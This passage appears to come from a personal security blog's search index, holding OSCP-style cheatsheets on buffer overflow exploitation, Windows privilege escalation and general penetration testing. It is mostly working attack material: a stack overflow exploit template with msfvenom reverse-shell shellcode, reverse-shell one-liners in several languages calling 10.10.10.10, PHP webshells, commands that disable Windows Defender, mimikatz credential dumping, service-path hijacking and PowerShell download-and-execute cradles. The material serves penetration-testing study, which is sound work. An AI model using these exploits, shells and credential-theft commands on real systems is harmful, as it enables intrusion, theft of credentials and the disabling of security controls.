ESP\rptr_jmp_esp = 0x5F4A358F\rpayload = \u0026quot;\u0026quot;\rpayload += \u0026quot;PASS \u0026quot;\rpayload += \u0026quot;A\u0026quot;*2606\rpayload += struct.pack(\u0026quot;\u0026lt;I\u0026quot;,ptr_jmp_esp)\r# msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=443 -f py -a x86 -b \u0026quot;\\x00\\x0a\\x0d\u0026quot; --var-name shellcode EXITFUNC=thread\r\u0026lt;paste shellcode here\u0026gt;\rnopsled = \u0026quot;\\x90\u0026quot;*12 # Put appropriate number of nops\rpayload += nopsled\rpayload += shellcode\rpayload += \u0026quot;D\u0026quot;*(size - len(payload))\rpayload += \u0026quot;\\r\\n\u0026quot;\rtry:\rprint \u0026quot;Sending evil code...\u0026quot;\rs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((rhost,rport))\rs.recv(1024)\rs.send(\u0026quot;USER test\\r\\n\u0026quot;)\rs.recv(1024)\rs.send(payload)\rs.close()\rexcept:\rprint \u0026quot;Oops! Something went wrong!\u0026quot;\rsys.exit()\rEXAM GUIDE Steps Find offset Ensure control over EIP at found offset (4 B\u0026rsquo;s) Find bad characters Find return address (JMP ESP) Ensure EIP overwrite (Breakpoint - F2 - at return address ) Ensure buffer length for shellcode is good enough Get a shell Commands /usr/bin/msf-pattern_create -l /usr/bin/msf-pattern_offset -q\r# avoid pointers with bad chars\r# !mona jmp -r esp -cpb \u0026quot;\\x00\\x0a\\x0d\u0026quot;\r# try selecting an application specific DLL instead of OS\r!mona jmp -r esp -cpb '\\x00'\r# Do\tNOT\tadd an encoder by yourself, let msfvenom decide that\r# [Recommended, reasons at the bottom] Stageless - use nc to connect to this shell msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=443 -b '\\x00' -f python --var-name shellcode EXITFUNC=thread\r# Do\tNOT\tadd an encoder by yourself, let msfvenom decide that\r# Staged - use multi/handler to connect to this shell\rmsfvenom -p windows/shell/reverse_tcp LHOST= LPORT=443 -b '\\x00' -f python --var-name shellcode EXITFUNC=thread\rcheatsheet.py import socket\rimport struct\rimport sys\rrhost = \u0026quot;192.168.\u0026quot;\rrport =\rsize = 3200\rcmd = \u0026quot;PASS \u0026quot;\reip_offset = # Only select program DLL. Do NOT select OS DLL\rptr_jmp_esp = # JMP ESP - xxxx.dll\r# Bad characters identified: \\x00\rbadchars = (\u0026quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\u0026quot;\r\u0026quot;\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026quot;\r\u0026quot;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\u0026quot;\r\u0026quot;\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\u0026quot;\r\u0026quot;\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\u0026quot;\r\u0026quot;\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\u0026quot;\r\u0026quot;\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\u0026quot;\r\u0026quot;\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026quot;)\r# msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=443 -b '\\x00' -f python --var-name shellcode EXITFUNC=thread\r# Remove the \u0026quot;b\u0026quot; prefix from each line\rshellcode = \u0026quot;\u0026quot;\rpayload = \u0026quot;\u0026quot;\rpayload += cmd\rpayload += \u0026quot;A\u0026quot;*eip_offset # padding\rpayload += struct.pack(\u0026quot;\u0026lt;I\u0026quot;,ptr_jmp_esp) # converting address to little endian\rpayload += \u0026quot;\\x90\u0026quot;*16 # nopsled\rpayload += shellcode\rpayload += \u0026quot;D\u0026quot;*(size - len(payload)) # trialing padding\rpayload += \u0026quot;\\r\\n\u0026quot;\r# Put a while loop to fuzz\r# while True:\rtry:\rprint \u0026quot;Sending evil payload...\u0026quot;\rs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\rs.connect((rhost,rport))\rs.recv(1024)\rs.send(\u0026quot;USER test\\r\\n\u0026quot;)\rs.recv(1024)\rs.send(payload)\rs.recv(1024)\rs.send(\u0026quot;QUIT\u0026quot;)\rs.close()\r# Fuzzing increment\r#payload += \u0026quot;A\u0026quot;\rexcept:\rprint \u0026quot;Oops! Something went wrong!\u0026quot;\r#print \u0026quot;Fuzzing crashed at %s bytes\u0026quot; % len(payload)\rsys.exit()\rWhy stageless Less the number of exploitation steps, the better More control over the shell execution process The stager that gets dropped in the staged shell, could be blocked or unable to execute for plethora of reasons unknown to you It\u0026rsquo;s more of a Metasploit thing, which could be one of the reasons it may get blocked Why staged Tried increasing the payload buffer but not enough space to fit a stageless shellcode Scripts Repo All the scripts are available here\n","permalink":"http://localhost:1313/bof/","title":"Buffer Overflow"},{"content":"Windows Privilege Escalation Cheatsheet Latest updated as of: 12 / June / 2022\nSo you got a shell, what now?\nThis post will help you with local enumeration as well as escalate your privileges further.\nUsage of different enumeration scripts and tools is encouraged, my favourite is WinPEAS. If confused which executable to use, use this\nKeep in mind:\nTo exploit services or registry, you require: appropriate write permissions service start permission service stop permission Look for non-standard programs on the system Note: This is a live document. I\u0026rsquo;ll be adding more content as I learn\nBinaries Get 64-bit netcat from here Get Chisel from here\nGeneral Information If nothing is specified, assume command can be run on cmd.exe or powershell.exe\nWho am I? whoami\recho %username%\rDo I have anything fun? Notice groups you are part of and privileges you have\nwhoami /all\rWhere am I? hostname\recho %hostname%\rAnyone home? Local users\nnet users\rDomain users\nnet users /domain\rWhat am I part of? Local groups\nnet groups\rDomain groups\nnet groups /domain\rWhat is this place? systeminfo\rIs it fancy? Both should be the same for ease of exploitation, if either is 32-bit then try to gain a 64-bit shell. Use PowerShell\n[environment]::Is64BitOperatingSystem\r[environment]::Is64BitProcess\rAm I tied up? Check LanguageMode. FullLanguage is nicer to have.\nUse PowerShell\n$ExecutionContext.SessionState.LanguageMode\rAnything reachable? Use PowerShell\nGet-AppLockerPolicy -Effective\rGet-AppLockerPolicy -Effective | select -ExpandedProperty RuleCollections\rWhat does the inside look like? Look for interesting services\nnetstat -ano\rLeave me alone Do you have admin privs?\nDisable Windows Defender real time monitoring\nSet-MpPreference -DisableRealTimeMonitoring $true\tDisable Windows Defender scanning for all files downloaded\nSet-MpPreference -DisableIOAVProtection $true\tFile Transfer SMB On KALI, start smb server to serve files. Get impacket from here Use double-quotes if file path has spaces in it\nsudo impacket-smbserver abcd /path/to/serve\rYou can download files in multiple ways.\nMount drive\nCMD or PowerShell\nnet use abcd: \\\\kali_ip\\myshare\rnet use abcd: /d # disconnect\rnet use abcd: /delete # then delete\rPowerShell\nNew-PSDrive -Name \u0026quot;abcd\u0026quot; -PSProvider \u0026quot;FileSystem\u0026quot; -Root \u0026quot;\\\\ip\\abcd\u0026quot;\rRemove-PSDrive -Name abcd\rCopy w/o mounting\ncopy //kali_ip/abcd/file_name C:\\path\\to\\save\rcopy C:\\path\\to\\file //kali_ip/abcd\rHTTP Load script in memory\nMay help bypass trivial anti-virus solutions\npowershell.exe -nop -ep bypass -c \u0026quot;IEX(New-Object Net.WebClient).DownloadString('http://ip/file')\u0026quot;\rpowershell.exe iex (iwr http://ip/file -usebasicparsing)\rSave to disk\npowershell.exe -nop -ep bypass -c \u0026quot;IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\\Users\\Public\\Downloads\\file')\u0026quot;\rpowershell.exe -nop -ep bypass -c \u0026quot;IWR -URI 'http://ip/file' -Outfile '/path/to/file'\u0026quot;\rCMD or PowerShell\ncertutil -urlcache -f http://kali_ip/file file\rAutomated Enumeration WinPEAS WinPEAS can be found here\nFor color, first apply below registry settings and then spawn a new shell\nREG ADD HKCU\\Console /v VirtualTerminalLevel /t REG_DWORD /d 1\r.\\winpeasany.exe quiet\rExploit suggester This works well with older machines\nWindows exploit suggester can be found here This script will be executed on Kali. First take the systeminfo info, paste it in a file\nAn update may be required, it will generate the Excel file necessary\n.\\windows-exploit-suggester.py --update\rFind vulns\n.\\windows-exploit-suggester.py -i systeminfo.txt -d 2022-xxx.xlsx\rPowerUp PowerUp can be found here\nAlthough not entirely allowed, we can leverage its Invoke-AllChecks function to quickly find escalation points\nThe script can be executed in multiple ways\nSave on disk, and execute powershell -ep bypass -c \u0026quot;\u0026amp; { Import-Module .\\PowerUp.ps1; Invoke-AllChecks; }\u0026quot;\rExecute from memory Modify the script to contain Invoke-AllChecks at the bottom of the script\npowershell.exe -nop -ep bypass -c \u0026quot;IEX(New-Object Net.WebClient).DownloadString('http://ip/PowerUp.ps1')\u0026quot;\rHacking the Services Checking Access using Accesschk.exe Below should give you an idea of some of the useful flags\n# .\\accesschk.exe /accepteula\r# -c : Name a windows service, or use * for all\r# -d : Only process directories\r# -k : Name a registry key e.g., hklm/software\r# -q : Omit banner\r# -s : Recurse\r# -u : Suppress errors\r# -v : Verbose\r# -w : Show objects with write access\rChecking service permissions\nALWAYS RUN THE FOLLOWING TO CHECK IF YOU\u0026rsquo;VE PERMISSIONS TO START AND STOP THE SERVICE\n.\\accesschk.exe /accepteula -ucqv \u0026lt;user\u0026gt; \u0026lt;svc_name\u0026gt;\rGet all writable services as per groups\n.\\accesschk.exe /accepteual -uwcqv Users *\r.\\accesschk.exe /accepteula -uwcqv \u0026quot;Authenticated Users\u0026quot; *\rCheck unquoted service paths by testing if directories are writable\n.\\accesschk.exe /accepteula -uwdv \u0026quot;C:\\Program Files\u0026quot;\rCheck user permissions on an executable\n.\\accesschk.exe /accepteula -uqv \u0026quot;C:\\Program Files\\abcd\\file.exe\u0026quot;\rFind all weak permissions Folders\n.\\accesschk.exe /accepteula -uwdqs Users c:\\\r.\\accesschk.exe /accepteula -uwdqs \u0026quot;Authenticated Users\u0026quot; c:\\\rFiles\n.\\accesschk.exe /accepteula -uwqs Users c:\\*.*\r.\\accesschk.exe /accepteula -uwqs \u0026quot;Authenticated Users\u0026quot; c:\\*.*\rWeak registry permissions\n.\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\svc_name\rGetting ACLs Can we do something about it?\nPowerShell\nGetting ACLs of services\nGet-Acl HKLM\\System\\CurrentControlSet\\Services\\svc_name | Format-List\rGet ACLs of any file or folder\n(get-acl C:\\path\\to\\file).access | ft IdentityReference,FileSystemRights,AccessControlType\rExploiting Services - sc.exe Query service configuration\nVerify config after doing all the changes\nsc qc svc\rWhat is the current state of the service?\nsc query svc\rModifying config\nsc config svc binpath= \u0026quot;\\\u0026quot;C:\\Downloads\\shell.exe\\\u0026quot;\u0026quot;\rIf dependencies exist, make it auto or NULL\nCheck if you can restart the dependant svc\nsc config depend_svc start= auto\rnet start depend_svc\rnet start svc\rsc config svc depend= \u0026quot;\u0026quot;\rTurn it off and back on again\nnet start/stop svc\rRegistry # Query configuration of registry entry of the service\rreg query HKLM\\System\\CurrentControlSet\\Services\\svc_name\r# Point the ImagePath to malicious executable\rreg add HKLM\\SYSTEM\\CurrentControlSet\\services\\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\\path\\shell.exe /f\r# Start/stop the service to get the shell\rnet start/stop svc\r# Execute a reverse_shell.msi as admin\r# Manually, both query's output should be 0x1 to exploit\rreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\rreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\rCredentials or Hashes Finding credentials Common creds location, always in plaintext\nreg query \u0026quot;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogin\u0026quot;\rreg query \u0026quot;HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\u0026quot; /s\rLook for interesting files that may contain creds\ndir /s SAM\rdir /s SYSTEM\rdir /s Unattend.xml\rExtracting credentials No Admin SMB can be used to extract credentials.\nFirst check if target connects back\nStart a listener on 445\nsudo nc -nvlp 445\rGet target to connect to it\ncopy \\\\kali_ip\\test\\file\rIf nc shows connection, it means hash can be extracted\nResponder is an OffSec authorized tool now\nReplace interface as required\nsudo responder -I tun0 -wrf\rGet the target to connect to your server and it will start dropping hashes. These are now required to cracked by your fav cracker (john or hashcat) to be able to use them to pass-the-hash\nWith Admin Mimikatz requires admin since a handle on lsass is needed to play with credentials (tokens,hashes,tickets) Use can either use mimikatz.exe or Invoke-Mimikatz.ps1\nElevate privileges to debug\nprivilege::debug\rDump logged on user and computer credentials\nsekurlsa::logonpasswords\rElevate privileges to SYSTEM by impersonation\ntoken::elevate\rRetrieves credential from LSA\nlsadump::lsa /patch\rList credentials in CredentialManager\nvault::list\rDump credentials in CredentialManager - plaintext password\nvault::cred /patch\rLeverage credentials Found plaintext password? On attacker machine you can attempt to login\n--system only works if admin creds are on hand\nwinexe -U 'user%pass123' [--system] //10.10.10.10 cmd.exe\rFound hash instead of plaintext password?\npth-winexe -U 'domain\\user%hash' [--system] //10.10.10.10 cmd.exe\rRunAs CMD\nrunas /savecred /user:admin C:\\abcd\\reverse.exe\rPowerShell Runas 1\n$password = ConvertTo-SecureString 'pass123' -AsPlainText -Force\r$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)\rStart-Process -FilePath \u0026quot;powershell\u0026quot; -argumentlist \u0026quot;IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')\u0026quot; -Credential $cred\rPowerShell Runas 2\n$username = \u0026quot;domain\\Administrator\u0026quot;\r$password = \u0026quot;pass123\u0026quot;\r$secstr = New-Object -TypeName System.Security.SecureString\r$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}\r$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr\rInvoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/shell.ps1') } -Credential $cred -Computer localhost\rFind Files Fast CMD or PowerShell\ndir /s \u0026lt;filename\u0026gt; # or extensions\rPowerShell\nGet-ChildItem -Path C:\\ -Include *filename_wildcard* -Recurse -ErrorAction SilentlyContinue\rPort Forwarding # If some port are listening on the target machine but inaccessible, forward the ports - Port Forwarding\r# winexe, pth-winexe, smbexec.py, psexec works on 445, MySQL on 3306\r# On KALI\r./chisel server --reverse --port 9001\r# On Windows\r.\\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT\r# Example --\u0026gt; .\\chisel.exe client KALI_IP:9001 R:445:127.0.0.1:445\r# On KALI\rwinexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT\rsmbexec.py domain/username:password@127.0.0.1 mysql --host=127.0.0.1 --port=KALI_PORT -u username -p\r","permalink":"http://localhost:1313/privesc-windows/","title":"Windows Privilege Escalation"},{"content":"Who Am I? Hi, my name is Karan Bhayani. I am a security professional who likes learning new things.\nI like to believe that only understanding how to attack and/or defend something is not sufficient and we should understand how things truly work. I am currently interested in Windows and Active Directory. Here are few papers I hold that says I know something\n\u0026hellip;and CRTP\nConnect With Me Have a question, suggestion, constructive criticism, or just wanna chat? Hit me up!\n","permalink":"http://localhost:1313/whoami/","title":"root@localhost:~ #whoami"},{"content":"OSCP Cheatsheet General Enumeration - Nmap Replace $ip with target IP\nInitial scan\nnmap -Pn -n -vvv -oN nmap/initial $ip\rIf no ports are found, scan in parts\nnmap -Pn -n -vvv -p1-500 -oN nmap/partial $ip\rScan all ports\nnmap -Pn -n -vvv -p- -oN nmap/allports $ip\rTargeted scanning\nnmap -Pn -n -vvv -p22,80 -oN nmap/targeted $ip\rUDP Scanning\nsudo nmap -Pn -n -vvv -sU -oN nmap/udp $ip\rAutomated nmap scanning (my preference is nmapAutomator, never missed a port)\n# It is recommended to scan ONE IP at a time\r# Do NOT overload the network\r# All scans, consecutively: Quick, Targeted, UDP, All ports, Vuln scan, CVE scan, Gobuster, Nikto\rnmapAutomator ip All\rBanner Grabbing telnet ip port\rnc -nv ip port\rcurl -iv $ip\rPort 21 - FTP Nmap script scanning - will reveal anonymous access\nnmap -Pn -n -vvv -p21 -sC -sV $ip\rChecking anonymous access manually\nftp ip\rftp\u0026gt; USER anonymous\rftp\u0026gt; PASS anonymous\rEasy view of FTP content - Browse to:\nftp://$ip\rUploading a binary or webshell\nftp\u0026gt; binary\rftp\u0026gt; put file/name\rPort 22 - SSH Additional banner grabbing\nssh root@$ip\rPort 53 - DNS # Get nameservers and domain name of the IP address\rnslookup\rnslookup\u0026gt; server $target_ip\rnslookup\u0026gt; $target\r# o/p: ns1.example.com\r# Get all sub-domains\rhost -l -a example.com $target_ip # or ns1.example.com\rPort 79 - Finger Run this script with following wordlist\n/usr/share/metasploit-framework/data/wordlists/unix_users.txt\rPort 80/443 - HTTP(S) Get web server, version, potential OS\ncurl -i http://ip\rUse Wappalyzer to identify technologies, web server, OS, database server deployed\nView-Source of pages to find interesting comments, directories, technologies, web application being used, etc.\nFinding hidden content Scanning each sub-domain and interesting directory is a good idea\n# Use small common wordlist first\r# Use big wordlist next\r# Use CMS specific wordlist if one is found\rgobuster dir -u http://$ip -w /wordlist -o gobust.out\r# Find technology specific content gobuster dir -u http://$ip -w /wordlist -o gobust_php.out -x php\r# Find hidden notes, readme, changelog\rgobuster dir -u http://$ip -w /wordlist -o gobust_txt.out -x txt\rFiles to browse manually\n/robots.txt\r/sitemap.xml\r# Make it throw an error\r/doesnotexist\rRun web server scanning\n# Identifies CMS\r# Identifies Shellshock\rnikto -host $ip -o nikto.txt\rWeb application specific scanning WordPress, use API\nwpscan --url http://$ip -e p,t,u --detection-mode aggressive \u0026gt; wpscan.log\rDrupal, found here\ndroopescan scan drupal http://$ip -t 32\rPort 110 - POP3 # Login\rtelnet $ip 110\rUSER test\rPASS test\r# List and view mails\r# O/P: \u0026lt;mail_number\u0026gt; \u0026lt;mail_length\u0026gt;\rlist\r# View mail\rretr \u0026lt;mail_number\u0026gt;\rquit\rPort 139/445 - SMB General enumeration\nnmap -Pn -n -p139,445 --script smb-* $ip\renum4linux -a $ip\rEnumerate hostname\nnmblookup -A $ip\rGet version - script available here\n./smbver.sh $ip [port]\rmsf\u0026gt;use auxiliary/scanner/smb/smb_version\rList shares Note: smbmap will state access type available, smbclient will NOT. To check access type using smbclient, it’s best to access each share, read a file, and write a file.\nsmbmap -H $ip\r# Get share items recursively\rsmbmap -H $ip -R \u0026lt;share\u0026gt;\rsmbmap -H $ip -d \u0026lt;domain\u0026gt; -u \u0026lt;user\u0026gt; -p \u0026lt;password\u0026gt;\rsmbclient -L \\\\$ip -N\r# Protocol Error?\rsmbclient -L \\\\$ip -N --option='client min protocol=NT1'\rsmbclient -L \\\\$ip -U \u0026lt;user\u0026gt;\rConnecting to a share\n# Anonymously\rsmbclient //$ip/share -N\r# Authenticated\rsmbclient //$ip/share -U \u0026lt;username\u0026gt;\r# Protocol Error?\rsmbclient //$ip/share -N --option='client min protocol=NT1'\rPort 161 - SNMP MIB Values Windows Parameters 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports # Brute force community strings\r# echo public \u0026gt; community\r# echo private \u0026gt;\u0026gt; community\r# echo manager \u0026gt;\u0026gt; community\r# for ip in $(seq 1 254);do echo 10.11.1.$ip;done \u0026gt; snmp-ips\ronesixtyone -c community -i snmp-ips\r# Enumerate entire MIB tree\rsnmpwalk -c public -v1 $ip\r# Enumerate specific MIB Value\rsnmpwalk -c public -v1 $ip $MIB_Value\rsnmp-check $ip\rPort 2049 - NFS # NFS \u0026lt; v4\r# Enumerating shares available, and mount points\rshowmount -e $ip\rshowmount -a $ip\r# Mounting, x = NFS Version\rmount -t nfs -o vers=x $ip:\u0026lt;share\u0026gt; \u0026lt;local_dir\u0026gt;\r# On target machine\r# Find mount points on the target where SUID programs and scripts can be run from mount | grep 'nosuid\\|noexec'\rShells / Payloads Universal Listeners # Netcat\r[sudo] rlwrap nc -nvlp \u0026lt;port\u0026gt;\r# msf multi/handler\rmsf(exploit/multi/handler)\u0026gt; set payload path/to/payload\rmsf(exploit/multi/handler)\u0026gt; set LHOST \u0026lt;ip\u0026gt; # or \u0026lt;interface\u0026gt;\rmsf(exploit/multi/handler)\u0026gt; set LPORT \u0026lt;port\u0026gt;\rLinux One-liners Credit to Pentest Monkey\n# bash\r/bin/bash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/443 0\u0026gt;\u0026amp;1\u0026quot;\r# Perl\rperl -e 'use Socket;$i=\u0026quot;10.10.10.10\u0026quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026quot;tcp\u0026quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;);open(STDOUT,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;);open(STDERR,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;);exec(\u0026quot;/bin/sh -i\u0026quot;);};'\r# Python\rpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.10.10\u0026quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'\r# PHP\rphp -r '$sock=fsockopen(\u0026quot;10.10.10.10\u0026quot;,443);exec(\u0026quot;/bin/sh -i \u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;);'\r# Ruby\rruby -rsocket -e'f=TCPSocket.open(\u0026quot;10.10.10.10\u0026quot;,443).to_i;exec sprintf(\u0026quot;/bin/sh -i \u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026quot;,f,f,f)'\r# Netcat : -u for UDP\rnc [-u] 10.10.10.10 443 -e /bin/bash\r# Netcat without -e : -u for UDP\rrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2\u0026gt;\u0026amp;1 | nc [-u] 10.10.10.10 443 \u0026gt; /tmp/f\r# Java\rr = Runtime.getRuntime()\rp = r.exec([\u0026quot;/bin/bash\u0026quot;,\u0026quot;-c\u0026quot;,\u0026quot;exec 5/dev/tcp/10.10.10.10/443;cat \u0026amp;5 \u0026gt;\u0026amp;5; done\u0026quot;] as String[])\rp.waitFor()\rReverse shell scripts PHP reverse shell available here or locally /usr/share/webshells/php/php-reverse-shell\nPython PTY shells available here\nWindows PowerShell reverse shell available here PHP reverse shell available here Netcat for Windows available here\n# PowerShell\rcp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1\rvi shell.ps1\r# go to end of file, paste the following\rInvoke-PowerShellTcp -Reverse -IPAddress [attacker_ip] -Port [attacker_port]\r# close, reverse shell ready to use\r# Netcat - use x64 or x32 as per target. powershell.exe or cmd.exe\rnc.exe x.x.x.x \u0026lt;port\u0026gt; -e powershell.exe\rPHP Webshells # Basic. system() or shell_exec() or exec()\r\u0026lt;?php system($_GET['cmd']);?\u0026gt;\r# More functional\r\u0026lt;?php\r$ip = 'http://10.10.14.4/' # [:port] . Change this\r# Upload\rif (isset($_GET['fupload'])) {\rfile_put_contents($_GET['fupload'], file_get_contents($ip . $_GET['fupload']));\r};\r# Execute code\r# shell_exec() or system() or exec()\rif (isset($_GET['cmd'])) {\recho \u0026quot;\u0026lt;pre\u0026gt;\u0026quot; . exec($_GET['cmd']) . \u0026quot;\u0026lt;/pre\u0026gt;\u0026quot;;\r};\r?\u0026gt;\rMetasploit System Binaries # Linux reverse shell - Staged\rmsfvenom -p linux/x86/shell/reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f elf \u0026gt; shell\r# Linux reverse shell - Stageless\rmsfvenom -p linux/x86/shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f elf \u0026gt; shell\r# Windows reverse shell - Staged\rmsfvenom -p windows/shell/reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f exe -o reverse.exe\r# Windows reverse shell - Stageless\rmsfvenom -p windows/x64/shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f exe -o reverse.exe\rWeb # PHP\rmsfvenom -p php/reverse_php # ASPX\rmsfvenom -p windows/shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f aspx -o shell.aspx\r# JSP\rmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f raw -o shell.jsp\r# WAR\rmsfvenom -p java/jsp_shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f war -o shell.war\rShellcode Select appropriate architecture\n# Linux Staged - use python or c\rmsfvenom -p linux/x86/shell/reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f python\r# Linux Stageless - use python or c\rmsfvenom -p linux/x86/shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f python\r# Windows Staged - use python or c\rmsfvenom -p windows/x64/shell/reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f python\r# Windows Stageless - use python or c\rmsfvenom -p windows/shell_reverse_tcp LHOST=\u0026lt;ip\u0026gt; LPORT=\u0026lt;port\u0026gt; -f python\rUpgrading your shell - Linux Upon initial access, it is crucial to achieve the highest functional shell possible for privesc purposes!\n# On victim machine\rwhich python[3]\rpython[3] -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\r# background the listener using ctrl+z\rstty -a # notice the number of rows and columns\rstty raw -echo\r# foreground the process: type fg, press enter\rstty rows xx\rstty columns xxx\rexport TERM=xterm-256color\rEscaping jailed Shells Go here\nFile Transfers Server # HTTP - Apache2\r# cp file /var/www/html/file_name\rsudo service apache2 start\r# HTTP - Python. Default port 8000\r# python2\rsudo python -m SimpleHTTPServer 80\r# python3\rsudo python3 -m http.server 80\r# SMB\rsudo impacket-smbserver \u0026lt;share_name\u0026gt; \u0026lt;path/to/share\u0026gt;\r# FTP\r# apt-get install python-pyftpdlib\rsudo python -m pyftpdlib -p 21\r# TFTP (UDP)\rsudo atftpd --daemon -port 69 /path/to/serve\r# Netcat\rnc -nvlp \u0026lt;port\u0026gt; \u0026lt; file/to/send\rLinux - HTTP # Wget\rwget http://\u0026lt;ip\u0026gt;/file_name -O /path/to/save/file\r# Netcat\rnc -nv \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; \u0026gt; file/to/recv\r# cURL\rcurl http://\u0026lt;ip\u0026gt;/file_name --output file_name\rWindows HTTP # Does not save file on the system\rpowershell.exe -nop -ep bypass -c \u0026quot;IEX(New-Object Net.WebClient).DownloadString('http://\u0026lt;ip\u0026gt;/\u0026lt;file_name\u0026gt;')\u0026quot;\r# Saves file on the system\rpowershell.exe -nop -ep bypass -c \u0026quot;iwr -uri http://\u0026lt;ip\u0026gt;/\u0026lt;file_name\u0026gt; -outfile path/to/save/file_name\u0026quot;\rpowershell.exe -nop -ep bypass -c \u0026quot;IEX(New-Object Net.WebClient).DownloadFile('http://\u0026lt;ip\u0026gt;/\u0026lt;file_name\u0026gt;','path/to/save/file_name')\u0026quot;\rcertutil.exe -urlcache -split -f http://\u0026lt;ip\u0026gt;/file file_save\r* Wget.ps1\recho $storageDir = $pwd \u0026gt;\u0026gt; wget.ps1\r$webclient = New-Object System.Net.WebClient \u0026gt;\u0026gt; wget.ps1\r# Download file from\r$url = \u0026quot;http://\u0026lt;ip\u0026gt;/file_name\u0026quot; 